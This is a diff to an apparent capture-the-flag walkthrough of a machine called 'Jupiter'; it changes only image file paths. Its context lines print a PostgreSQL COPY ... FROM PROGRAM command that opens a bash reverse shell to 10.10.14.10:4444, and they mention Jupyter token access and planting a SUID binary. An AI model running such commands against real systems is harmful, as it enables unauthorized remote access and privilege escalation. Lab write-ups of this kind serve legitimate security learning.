@@ -90,7 +90,7 @@ COPY cmd_exec FROM program 'bash -c \"bash -i >& /dev/tcp/10.10.14.10/4444 0>&1\
 
 Then, we would catch a reverse shell on a listener port:
 
-<figure><img src="../../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (467) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -252,7 +252,7 @@ juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-06-08-18.log
 
 We can visit the site with the `?token` parameter at the end and be brought to a file directory:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (10).png" alt=""><figcaption></figcaption></figure>
 
 When we click 'New', there's an option to create a new Notebook:
 
@@ -260,7 +260,7 @@ When we click 'New', there's an option to create a new Notebook:
 
 This brings us to what seems to be a Python interpreter:
 
-<figure><img src="../../../.gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (690) (2).png" alt=""><figcaption></figcaption></figure>
 
 I simply ran a command to generate another SUID binary on the machine.
 
